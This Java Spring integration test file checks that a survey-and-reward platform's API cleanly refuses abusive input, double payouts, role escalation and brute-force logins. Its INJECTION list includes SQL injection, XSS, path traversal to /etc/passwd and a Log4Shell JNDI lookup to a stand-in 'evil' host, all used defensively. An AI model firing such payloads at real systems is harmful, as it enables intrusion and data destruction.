package mn.uziy.backend.security;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.patch;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Callable;
import java.util.concurrent.CyclicBarrier;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.springframework.http.MediaType;
import org.springframework.test.web.servlet.MvcResult;
import org.springframework.test.web.servlet.request.MockHttpServletRequestBuilder;

/**
 * What a hostile or sloppy client can do with the inputs: malformed bodies, injection strings, absurd numbers,
 * attempts to grant themselves roles or money. The rule for every case: a clean 4xx (or a harmless 2xx), never a 500.
 */
class ApiAbuseIntegrationTest extends AbstractApiIntegrationTest {

    private static final String[] INJECTION = {
            "' OR '1'='1", "'; DROP TABLE users; --", "\" OR \"\"=\"", "1; SELECT pg_sleep(5)",
            "<script>alert(1)</script>", "${jndi:ldap://evil/a}", "../../etc/passwd", "%00", "{{7*7}}"};

    private MvcResult send(MockHttpServletRequestBuilder request, Long as, String json) throws Exception {
        if (json != null) {
            request.contentType(MediaType.APPLICATION_JSON).content(json);
        }
        if (as != null) {
            request.header("Authorization", bearer(as));
        }
        return mvc.perform(request).andReturn();
    }

    private int status(MockHttpServletRequestBuilder request, Long as, String json) throws Exception {
        return send(request, as, json).getResponse().getStatus();
    }

    private static String json(String s) {
        return "\"" + s.replace("\\", "\\\\").replace("\"", "\\\"") + "\"";
    }

    // ------- malformed requests ---------------------------------------------

    @ParameterizedTest
    @ValueSource(strings = {"", "not json", "{", "[]", "null", "{\"phoneNumber\":", "{\"phoneNumber\":12345678}",
            "{\"phoneNumber\":[],\"password\":{}}", "{\"phoneNumber\":\"12345678\",\"password\":null}"})
    void loginWithBrokenBodiesIsA400Or401NeverA500(String body) throws Exception {
        assertThat(status(post("/auth/login"), null, body)).isBetween(400, 401);
    }

    @Test
    void aWrongContentTypeIsRefusedCleanly() throws Exception {
        int s = mvc.perform(post("/auth/login").contentType(MediaType.TEXT_PLAIN).content("x")).andReturn()
                .getResponse().getStatus();

        assertThat(s).isEqualTo(415);
    }

    @Test
    void anOversizedRequestBodyIsRefusedBeforeItIsRead() throws Exception {
        String huge = "{\"phoneNumber\":\"12345678\",\"password\":\"" + "x".repeat(300 * 1024) + "\"}";

        assertThat(status(post("/auth/login"), null, huge)).isEqualTo(413);
    }

    @Test
    void nonNumericIdsInThePathAreA400() throws Exception {
        long admin = admin();

        assertThat(status(get("/admin/users/abc"), admin, null)).isEqualTo(400);
        assertThat(status(get("/admin/campaigns/1.5"), admin, null)).isEqualTo(400);
        assertThat(status(get("/admin/users/99999999999999999999"), admin, null)).isEqualTo(400);
    }

    @Test
    void unknownEnumValuesAreA400() throws Exception {
        long admin = admin();
        long company = company();
        long campaign = activeCampaign(company);

        assertThat(status(patch("/admin/campaigns/" + campaign + "/moderate").param("decision", "HACKED"), admin, null))
                .isEqualTo(400);
        assertThat(status(patch("/company/campaigns/" + campaign + "/status").param("status", "DELETED"), company, null))
                .isEqualTo(400);
        assertThat(status(patch("/admin/payouts/1/decision").param("decision", "PENDING_FOREVER"), admin, null))
                .isEqualTo(400);
    }

    @Test
    void analyticsParametersAreValidated() throws Exception {
        long company = company();

        assertThat(status(get("/company/analytics").param("days", "abc"), company, null)).isEqualTo(400);
        assertThat(status(get("/company/analytics").param("days", "-5"), company, null)).isEqualTo(400);
        assertThat(status(get("/company/analytics").param("days", "100000"), company, null)).isEqualTo(400);
        assertThat(status(get("/company/analytics").param("campaignId", "x"), company, null)).isEqualTo(400);
    }

    // ------- injection ------------------------------------------------------

    @Test
    void injectionStringsInLoginAreJustWrongCredentials() throws Exception {
        for (String payload : INJECTION) {
            // A fresh number each time: five wrong guesses at one number would (rightly) lock it.
            int s = status(post("/auth/login"), null,
                    "{\"phoneNumber\":\"" + freshPhone() + "\",\"password\":" + json(payload) + "}");
            assertThat(s).as(payload).isEqualTo(401);
            int phone = status(post("/auth/login"), null,
                    "{\"phoneNumber\":" + json(payload) + ",\"password\":\"x\"}");
            assertThat(phone).as("phone " + payload).isEqualTo(400);
        }
    }

    @Test
    void injectionStringsInCampaignFieldsAreStoredAsPlainTextAndDoNoHarm() throws Exception {
        long company = company();
        Long usersBefore = jdbc.queryForObject("SELECT COUNT(*) FROM users", Long.class);

        for (String payload : INJECTION) {
            MvcResult r = send(post("/company/campaigns"), company,
                    "{\"title\":" + json(payload) + ",\"hasVideo\":false,\"targetCity\":" + json(payload)
                            + ",\"totalBudget\":100000,\"targetViewers\":10,"
                            + "\"questions\":[{\"prompt\":" + json(payload) + ",\"type\":\"TEXT\"}]}");
            assertThat(r.getResponse().getStatus()).as(payload).isLessThan(500);
        }

        assertThat(jdbc.queryForObject("SELECT COUNT(*) FROM users", Long.class)).isEqualTo(usersBefore);
        assertThat(jdbc.queryForObject("SELECT to_regclass('public.users') IS NOT NULL", Boolean.class)).isTrue();
    }

    @Test
    void injectionStringsInQueryParametersAreRefusedOrHarmless() throws Exception {
        long admin = admin();
        long company = company();

        for (String payload : INJECTION) {
            assertThat(status(get("/admin/campaigns").param("status", payload), admin, null)).as(payload)
                    .isBetween(400, 499);
            assertThat(status(get("/admin/campaigns").param("companyId", payload), admin, null)).as(payload)
                    .isBetween(400, 499);
            assertThat(status(get("/company/analytics").param("campaignId", payload), company, null)).as(payload)
                    .isBetween(400, 499);
        }
    }

    // ------- values that make no sense ----------------------------------------

    @ParameterizedTest
    @ValueSource(strings = {"-1", "0", "0.0000001", "1e309", "99999999999999999999", "\"abc\"", "null", "true"})
    void absurdPayoutAmountsAreRefusedAndMoveNoMoney(String amount) throws Exception {
        long viewer = viewer(1000);

        int s = status(post("/viewer/payouts"), viewer,
                "{\"amount\":" + amount + ",\"bank\":\"Khan Bank\",\"accountNumber\":\"1\","
                        + "\"accountName\":\"A\"}");

        assertThat(s).as(amount).isBetween(400, 499);
        assertThat(balanceOf(viewer)).isEqualTo(1000.0);
    }

    /**
     * The form stopped asking for the national ID (2026-10-14) and the column is gone. An app installed before that
     * still sends the field: the request must keep working and the value must not be kept anywhere.
     */
    @Test
    void anOldAppThatStillSendsTheNationalIdCanCashOutAndTheIdIsNotKept() throws Exception {
        long viewer = viewer(5000);

        int s = status(post("/viewer/payouts"), viewer,
                "{\"amount\":5000,\"bank\":\"Khan Bank\",\"accountNumber\":\"1\",\"accountName\":\"A\","
                        + "\"nationalId\":\"AA00000000\"}");

        assertThat(s).isEqualTo(200);
        assertThat(jdbc.queryForObject("""
                SELECT count(*) FROM information_schema.columns
                WHERE table_name = 'payout_requests' AND column_name = 'national_id'""", Integer.class)).isZero();
    }

    /**
     * Audit 2026-10-22: these answered 500. 37 Cyrillic letters are under the 100-character limit but over
     * BCrypt's 72 bytes; a login body without a phone reached the lock map with a null key.
     */
    @Test
    void aTooLongCyrillicPasswordAndALoginWithoutAPhoneAreRefusedNot500() throws Exception {
        int reset = status(post("/auth/password/reset"), null, """
                {"phoneNumber":"88112233","verificationId":"00000000-0000-0000-0000-000000000001",
                 "newPassword":"%s"}""".formatted("ө".repeat(37)));
        assertThat(reset).isEqualTo(400);

        assertThat(status(post("/auth/login"), null, "{\"password\":\"whatever1\"}")).isEqualTo(400);
    }

    @Test
    void aPayoutLargerThanTheBalanceIsRefused() throws Exception {
        long viewer = viewer(5000);

        int s = status(post("/viewer/payouts"), viewer,
                "{\"amount\":5001,\"bank\":\"Khan Bank\",\"accountNumber\":\"1\",\"accountName\":\"A\"}");

        assertThat(s).isEqualTo(400);
        assertThat(balanceOf(viewer)).isEqualTo(5000.0);
    }

    @Test
    void absurdCampaignNumbersAreRefusedNotStored() throws Exception {
        long company = company();
        long before = jdbc.queryForObject("SELECT COUNT(*) FROM campaigns WHERE company_id = ?", Long.class, company);

        for (String fields : new String[] {
                "\"totalBudget\":-1000,\"targetViewers\":10",
                "\"totalBudget\":0,\"targetViewers\":10",
                "\"totalBudget\":100000,\"targetViewers\":-5",
                "\"totalBudget\":100000,\"targetViewers\":0",
                "\"totalBudget\":100000,\"targetViewers\":2147483647",
                "\"totalBudget\":100000,\"rewardPerUser\":-70",
                "\"totalBudget\":100000,\"rewardPerUser\":0.5",
                "\"totalBudget\":1e300,\"targetViewers\":10",
                "\"totalBudget\":100000,\"targetViewers\":10,\"rewardPerUser\":70",
                "\"totalBudget\":100000"}) {
            int s = status(post("/company/campaigns"), company,
                    "{\"title\":\"x\",\"hasVideo\":false,\"questions\":[{\"prompt\":\"q\",\"type\":\"TEXT\"}]," + fields + "}");
            assertThat(s).as(fields).isBetween(400, 499);
        }
        long after = jdbc.queryForObject("SELECT COUNT(*) FROM campaigns WHERE company_id = ?", Long.class, company);
        assertThat(after).isEqualTo(before);
    }

    @Test
    void tooLongTextIsA400NotADatabaseCrash() throws Exception {
        long company = company();
        String huge = "x".repeat(5000);

        int title = status(post("/company/campaigns"), company,
                "{\"title\":\"" + huge + "\",\"hasVideo\":false,\"totalBudget\":100000,\"targetViewers\":10,"
                        + "\"questions\":[{\"prompt\":\"q\",\"type\":\"TEXT\"}]}");
        int city = status(post("/company/campaigns"), company,
                "{\"title\":\"x\",\"hasVideo\":false,\"targetCity\":\"" + huge + "\",\"totalBudget\":100000,"
                        + "\"targetViewers\":10,\"questions\":[{\"prompt\":\"q\",\"type\":\"TEXT\"}]}");
        int video = status(post("/company/campaigns"), company,
                "{\"title\":\"x\",\"videoUrl\":\"" + huge + "\",\"durationSeconds\":30,\"totalBudget\":100000,"
                        + "\"targetViewers\":10,\"questions\":[{\"prompt\":\"q\",\"type\":\"TEXT\"}]}");

        assertThat(title).as("title").isBetween(400, 499);
        assertThat(city).as("city").isBetween(400, 499);
        assertThat(video).as("videoUrl").isBetween(400, 499);
    }

    @Test
    void companyAccountFieldsAreBounded() throws Exception {
        String huge = "x".repeat(5000);
        long admin = admin();

        assertThat(status(post("/admin/companies"), admin,
                "{\"phoneNumber\":\"" + freshPhone() + "\",\"password\":\"abcdef\",\"companyName\":\"" + huge + "\"}"))
                .isBetween(400, 499);
        assertThat(status(post("/admin/companies"), admin,
                "{\"phoneNumber\":\"" + freshPhone() + "\",\"password\":\"" + huge + "\",\"companyName\":\"X\"}"))
                .isBetween(400, 499);
    }

    /** Audit 2026-10-22: anyone could open a company account on any phone (a viewer's too) and burn BCrypt time. */
    @Test
    void companiesCanNoLongerRegisterThemselves() throws Exception {
        String phone = freshPhone();

        int s = status(post("/auth/register/company"), null,
                "{\"phoneNumber\":\"" + phone + "\",\"password\":\"abcdef\",\"companyName\":\"X\"}");

        assertThat(s).isEqualTo(404);
        assertThat(jdbc.queryForObject("SELECT COUNT(*) FROM users WHERE phone_number = ?", Long.class, phone))
                .isZero();
    }

    // ------- privilege and money escalation ----------------------------------

    @Test
    void openingACompanyAccountCannotGrantARoleOrAMoneyBalance() throws Exception {
        String phone = freshPhone();

        int s = status(post("/admin/companies"), admin(),
                "{\"phoneNumber\":\"" + phone + "\",\"password\":\"abcdef\",\"companyName\":\"X\","
                        + "\"role\":\"ADMIN\",\"balance\":999999,\"isVerified\":true,\"id\":1}");

        assertThat(s).isEqualTo(201);
        assertThat(jdbc.queryForObject("SELECT role FROM users WHERE phone_number = ?", String.class, phone))
                .isEqualTo("COMPANY");
        assertThat(jdbc.queryForObject("SELECT balance FROM users WHERE phone_number = ?", Double.class, phone))
                .isZero();
        assertThat(jdbc.queryForObject("SELECT is_verified FROM users WHERE phone_number = ?", Boolean.class, phone))
                .isFalse();
    }

    @Test
    void aViewerCannotRegisterWithoutAVerifiedPhone() throws Exception {
        int s = status(post("/auth/register/viewer"), null,
                "{\"phoneNumber\":\"" + freshPhone() + "\",\"password\":\"abcdef\",\"lastName\":\"Бат\",\"firstName\":\"Болд\",\"gender\":\"MALE\","
                        + "\"birthDate\":\"2000-01-01\",\"city\":\"Улаанбаатар\","
                        + "\"verificationId\":\"" + java.util.UUID.randomUUID() + "\"}");

        assertThat(s).isEqualTo(400);
    }

    /**
     * Regression (2026-10-13): the simulated provider used to verify every phone at the first poll, so the app
     * registered before any SMS was sent. Polling alone must never verify; only the SMS does.
     */
    @Test
    void aPhoneCannotBeRegisteredBeforeItsSmsArrives() throws Exception {
        String phone = freshPhone();
        String started = mvc.perform(post("/auth/phone-verifications").contentType(MediaType.APPLICATION_JSON)
                .content("{\"phoneNumber\":\"" + phone + "\"}")).andReturn().getResponse().getContentAsString();
        String id = com.jayway.jsonpath.JsonPath.read(started, "$.verificationId");
        String registration = "{\"phoneNumber\":\"" + phone + "\",\"password\":\"abcdef\",\"lastName\":\"Бат\",\"firstName\":\"Болд\",\"gender\":\"MALE\","
                + "\"birthDate\":\"2000-01-01\",\"city\":\"Улаанбаатар\",\"district\":\"Баянзүрх\",\"verificationId\":\"" + id + "\"}";

        for (int poll = 0; poll < 3; poll++) {
            String state = mvc.perform(org.springframework.test.web.servlet.request.MockMvcRequestBuilders
                    .get("/auth/phone-verifications/" + id)).andReturn().getResponse().getContentAsString();
            assertThat(com.jayway.jsonpath.JsonPath.<String>read(state, "$.status")).isEqualTo("PENDING");
        }
        assertThat(status(post("/auth/register/viewer"), null, registration)).isEqualTo(400);

        String sessionId = jdbc.queryForObject("SELECT provider_session_id FROM phone_verifications WHERE id = ?",
                String.class, java.util.UUID.fromString(id));
        assertThat(status(post("/auth/phone-verifications/simulated-sms/" + sessionId), null, null)).isEqualTo(204);

        assertThat(status(post("/auth/register/viewer"), null, registration)).isEqualTo(201);
    }

    @Test
    void aCompanyCannotApproveItsOwnCampaignOrChangeThePlatformCommission() throws Exception {
        long company = company();
        long campaign = campaign(company, "PENDING", "ALL", 0, 100, "ALL");

        assertThat(status(patch("/admin/campaigns/" + campaign + "/moderate").param("decision", "ACTIVE"), company,
                null)).isEqualTo(403);
        assertThat(status(patch("/admin/platform-settings"), company,
                "{\"commissionPercent\":0,\"minRewardPerViewer\":1}")).isEqualTo(403);
        assertThat(status(patch("/company/campaigns/" + campaign + "/status").param("status", "ACTIVE"), company,
                null)).as("a company may not activate a campaign itself").isEqualTo(409);
        assertThat(jdbc.queryForObject("SELECT status FROM campaigns WHERE id = ?", String.class, campaign))
                .isEqualTo("PENDING");
    }

    @Test
    void aViewerCannotApproveTheirOwnPayout() throws Exception {
        long viewer = viewer(1000);
        long payout = jdbc.queryForObject("""
                INSERT INTO payout_requests (user_id, amount, bank, account_number, account_name)
                VALUES (?, 500, 'Khan Bank', '1', 'A') RETURNING id""", Long.class, viewer);

        assertThat(status(patch("/admin/payouts/" + payout + "/decision").param("decision", "APPROVED"), viewer, null))
                .isEqualTo(403);
        assertThat(jdbc.queryForObject("SELECT status FROM payout_requests WHERE id = ?", String.class, payout))
                .isEqualTo("PENDING");
    }

    @Test
    void aPayoutCannotBeDecidedTwice() throws Exception {
        long admin = admin();
        long viewer = viewer(1000);
        long payout = jdbc.queryForObject("""
                INSERT INTO payout_requests (user_id, amount, bank, account_number, account_name)
                VALUES (?, 500, 'Khan Bank', '1', 'A') RETURNING id""", Long.class, viewer);

        int first = status(patch("/admin/payouts/" + payout + "/decision").param("decision", "REJECTED"), admin, null);
        double afterReject = balanceOf(viewer);
        int second = status(patch("/admin/payouts/" + payout + "/decision").param("decision", "REJECTED"), admin, null);

        assertThat(first).isEqualTo(200);
        assertThat(second).as("deciding again").isBetween(400, 409);
        assertThat(balanceOf(viewer)).as("a second rejection must not refund twice").isEqualTo(afterReject);
    }

    // ------- reward abuse ---------------------------------------------------

    private String answerBody(long questionId, String answerJson) {
        return "{\"answers\":[{\"questionId\":" + questionId + ",\"answerJson\":" + json(answerJson) + "}]}";
    }

    @Test
    void aRewardIsPaidOnlyOncePerViewerAndCampaign() throws Exception {
        long company = company();
        long campaign = activeCampaign(company);
        long q = question(campaign, 1, "SINGLE_CHOICE", "[\"Yes\",\"No\"]", true);
        long viewer = viewer(0);

        int first = status(post("/viewer/campaigns/" + campaign + "/submit"), viewer, answerBody(q, "\"Yes\""));
        int second = status(post("/viewer/campaigns/" + campaign + "/submit"), viewer, answerBody(q, "\"Yes\""));

        assertThat(first).isEqualTo(200);
        assertThat(second).isEqualTo(409);
        assertThat(balanceOf(viewer)).isEqualTo(70.0);
    }

    @Test
    void aQuizPaysOnlyForTheCorrectOptionAndNeverRevealsIt() throws Exception {
        long campaign = activeCampaign(company());
        long q = jdbc.queryForObject("""
                INSERT INTO survey_questions (campaign_id, position, prompt, q_type, options_json, required,
                    correct_answer)
                VALUES (?, 1, 'Q', 'QUIZ', CAST('["Red","Blue"]' AS jsonb), TRUE, 'Blue') RETURNING id""",
                Long.class, campaign);
        long viewer = viewer(0);
        String check = "/viewer/campaigns/" + campaign + "/questions/" + q + "/check";

        String questions = mvc.perform(get("/viewer/campaigns/" + campaign + "/questions")
                .header("Authorization", bearer(viewer))).andReturn().getResponse()
                .getContentAsString(StandardCharsets.UTF_8);
        String wrongCheck = mvc.perform(post(check).contentType(MediaType.APPLICATION_JSON)
                .content("{\"answer\":\"Red\"}").header("Authorization", bearer(viewer)))
                .andReturn().getResponse().getContentAsString(StandardCharsets.UTF_8);
        int wrongSubmit = status(post("/viewer/campaigns/" + campaign + "/submit"), viewer, answerBody(q, "\"Red\""));
        int rightSubmit = status(post("/viewer/campaigns/" + campaign + "/submit"), viewer, answerBody(q, "\"Blue\""));

        assertThat(questions).doesNotContain("correct");
        assertThat(wrongCheck).isEqualTo("{\"correct\":false}");
        assertThat(wrongSubmit).isEqualTo(400);
        assertThat(rightSubmit).isEqualTo(200);
        assertThat(balanceOf(viewer)).isEqualTo(70.0);
    }

    @Test
    void parallelSubmissionsPayTheRewardExactlyOnce() throws Exception {
        long company = company();
        long campaign = activeCampaign(company);
        long q = question(campaign, 1, "SINGLE_CHOICE", "[\"Yes\",\"No\"]", true);
        long viewer = viewer(0);
        String token = bearer(viewer);

        List<Integer> statuses = parallel(8, () -> mvc.perform(post("/viewer/campaigns/" + campaign + "/submit")
                .contentType(MediaType.APPLICATION_JSON).content(answerBody(q, "\"Yes\""))
                .header("Authorization", token)).andReturn().getResponse().getStatus());

        assertThat(statuses.stream().filter(s -> s == 200).count()).isEqualTo(1);
        assertThat(statuses).allMatch(s -> s == 200 || s == 409 || s == 500 && false || s < 500,
                "no server error under a race: " + statuses);
        assertThat(balanceOf(viewer)).isEqualTo(70.0);
        assertThat(jdbc.queryForObject("SELECT COUNT(*) FROM view_history WHERE user_id = ?", Long.class, viewer))
                .isEqualTo(1L);
    }

    @Test
    void theLastBudgetUnitGoesToExactlyOneOfManyViewers() throws Exception {
        long company = company();
        long campaign = activeCampaign(company);
        jdbc.update("UPDATE campaigns SET remaining_budget = 100 WHERE id = ?", campaign); // one view left
        long q = question(campaign, 1, "SINGLE_CHOICE", "[\"Yes\"]", true);
        List<Long> viewers = new ArrayList<>();
        for (int i = 0; i < 6; i++) {
            viewers.add(viewer(0));
        }
        var calls = new ArrayList<Callable<Integer>>();
        for (long v : viewers) {
            String token = bearer(v);
            calls.add(() -> mvc.perform(post("/viewer/campaigns/" + campaign + "/submit")
                    .contentType(MediaType.APPLICATION_JSON).content(answerBody(q, "\"Yes\""))
                    .header("Authorization", token)).andReturn().getResponse().getStatus());
        }

        List<Integer> statuses = parallelCalls(calls);

        assertThat(statuses.stream().filter(s -> s == 200).count()).as("%s", statuses).isEqualTo(1);
        assertThat(jdbc.queryForObject("SELECT remaining_budget FROM campaigns WHERE id = ?", Double.class, campaign))
                .isGreaterThanOrEqualTo(0.0);
        assertThat(statuses).noneMatch(s -> s >= 500);
    }

    @Test
    void parallelPayoutRequestsCannotSpendTheSameBalanceTwice() throws Exception {
        long viewer = viewer(5000);
        String token = bearer(viewer);

        List<Integer> statuses = parallel(6, () -> mvc.perform(post("/viewer/payouts")
                .contentType(MediaType.APPLICATION_JSON)
                .content("{\"amount\":5000,\"bank\":\"Khan Bank\",\"accountNumber\":\"1\",\"accountName\":\"A\"}")
                .header("Authorization", token)).andReturn().getResponse().getStatus());

        assertThat(balanceOf(viewer)).as("balance never goes negative").isGreaterThanOrEqualTo(0.0);
        assertThat(jdbc.queryForObject("SELECT COALESCE(SUM(amount),0) FROM payout_requests WHERE user_id = ?",
                Double.class, viewer)).as("requested in total, statuses " + statuses).isLessThanOrEqualTo(5000.0);
        assertThat(statuses).as("no server error under a race").noneMatch(s -> s >= 500);
    }

    @Test
    void aViewerCannotSubmitForACampaignThatIsNotRunning() throws Exception {
        long company = company();
        long viewer = viewer(0);
        for (String status : new String[] {"PENDING", "PAUSED", "COMPLETED", "REJECTED", "AWAITING_PAYMENT"}) {
            long campaign = campaign(company, status, "ALL", 0, 100, "ALL");
            long q = question(campaign, 1, "TEXT", "[]", true);

            assertThat(status(post("/viewer/campaigns/" + campaign + "/submit"), viewer, answerBody(q, "\"hi\"")))
                    .as(status).isBetween(400, 499);
        }
        assertThat(balanceOf(viewer)).isZero();
    }

    @Test
    void aViewerOutsideTheTargetingCannotCollectTheReward() throws Exception {
        long company = company();
        long femaleOnly = campaign(company, "ACTIVE", "FEMALE", 0, 100, "ALL");
        long qa = question(femaleOnly, 1, "TEXT", "[]", true);
        long olderOnly = campaign(company, "ACTIVE", "ALL", 60, 100, "ALL");
        long qb = question(olderOnly, 1, "TEXT", "[]", true);
        long otherCity = campaign(company, "ACTIVE", "ALL", 0, 100, "Дархан");
        long qc = question(otherCity, 1, "TEXT", "[]", true);
        long man = viewer(0); // male, born 2000, Улаанбаатар

        assertThat(status(post("/viewer/campaigns/" + femaleOnly + "/submit"), man, answerBody(qa, "\"hi\"")))
                .as("gender").isBetween(400, 499);
        assertThat(status(post("/viewer/campaigns/" + olderOnly + "/submit"), man, answerBody(qb, "\"hi\"")))
                .as("age").isBetween(400, 499);
        assertThat(status(post("/viewer/campaigns/" + otherCity + "/submit"), man, answerBody(qc, "\"hi\"")))
                .as("city").isBetween(400, 499);
        assertThat(balanceOf(man)).isZero();
    }

    @Test
    void aRewardNeedsRealAnswersToTheRequiredQuestions() throws Exception {
        long company = company();
        long campaign = activeCampaign(company);
        long required = question(campaign, 1, "SINGLE_CHOICE", "[\"Yes\",\"No\"]", true);
        long viewer = viewer(0);

        int unrelated = status(post("/viewer/campaigns/" + campaign + "/submit"), viewer,
                answerBody(987654321L, "\"Yes\""));
        int blank = status(post("/viewer/campaigns/" + campaign + "/submit"), viewer, answerBody(required, ""));

        assertThat(unrelated).as("answer to an unrelated question").isBetween(400, 499);
        assertThat(blank).as("blank answer").isBetween(400, 499);
        assertThat(balanceOf(viewer)).isZero();
    }

    @Test
    void anAnswerThatIsNotValidJsonIsA400NotADatabaseCrash() throws Exception {
        long company = company();
        long campaign = activeCampaign(company);
        long q = question(campaign, 1, "TEXT", "[]", true);
        long viewer = viewer(0);

        for (String bad : new String[] {"{not json", "undefined", "\"unterminated", "[1,2"}) {
            assertThat(status(post("/viewer/campaigns/" + campaign + "/submit"), viewer,
                    "{\"answers\":[{\"questionId\":" + q + ",\"answerJson\":" + json(bad) + "}]}"))
                    .as(bad).isBetween(400, 499);
        }
        assertThat(balanceOf(viewer)).isZero();
    }

    @Test
    void anOversizedAnswerIsRefused() throws Exception {
        long company = company();
        long campaign = activeCampaign(company);
        long q = question(campaign, 1, "TEXT", "[]", true);

        int s = status(post("/viewer/campaigns/" + campaign + "/submit"), viewer(0),
                answerBody(q, "\"" + "x".repeat(200_000) + "\""));

        assertThat(s).isBetween(400, 499);
    }

    @Test
    void aChoiceAnswerOutsideTheOptionsIsRefused() throws Exception {
        long company = company();
        long campaign = activeCampaign(company);
        long q = question(campaign, 1, "SINGLE_CHOICE", "[\"Yes\",\"No\"]", true);
        long viewer = viewer(0);

        int s = status(post("/viewer/campaigns/" + campaign + "/submit"), viewer, answerBody(q, "\"Maybe\""));

        assertThat(s).isBetween(400, 499);
        assertThat(balanceOf(viewer)).isZero();
    }

    // ------- brute force ----------------------------------------------------

    @Test
    void repeatedWrongPasswordsLockTheAttackerOut() throws Exception {
        long viewer = viewer(0);
        String phone = phoneOf(viewer);
        int lastWrong = 0;
        for (int i = 0; i < 30; i++) {
            lastWrong = status(post("/auth/login"), null,
                    "{\"phoneNumber\":\"" + phone + "\",\"password\":\"wrong-" + i + "\"}");
        }

        assertThat(lastWrong).as("after 30 wrong guesses the door must be slowed or shut").isEqualTo(429);
        int rightPasswordNow = status(post("/auth/login"), null,
                "{\"phoneNumber\":\"" + phone + "\",\"password\":\"" + PASSWORD + "\"}");
        assertThat(rightPasswordNow).as("even the right password waits out the lock").isEqualTo(429);
    }

    // ------- helpers --------------------------------------------------------

    private List<Integer> parallel(int threads, Callable<Integer> call) throws Exception {
        List<Callable<Integer>> calls = new ArrayList<>();
        for (int i = 0; i < threads; i++) {
            calls.add(call);
        }
        return parallelCalls(calls);
    }

    private List<Integer> parallelCalls(List<Callable<Integer>> calls) throws Exception {
        ExecutorService pool = Executors.newFixedThreadPool(calls.size());
        CyclicBarrier gate = new CyclicBarrier(calls.size());
        try {
            List<Future<Integer>> futures = new ArrayList<>();
            for (Callable<Integer> c : calls) {
                futures.add(pool.submit(() -> {
                    gate.await();
                    return c.call();
                }));
            }
            List<Integer> out = new ArrayList<>();
            for (Future<Integer> f : futures) {
                out.add(f.get(60, TimeUnit.SECONDS));
            }
            return out;
        } finally {
            pool.shutdownNow();
        }
    }
}
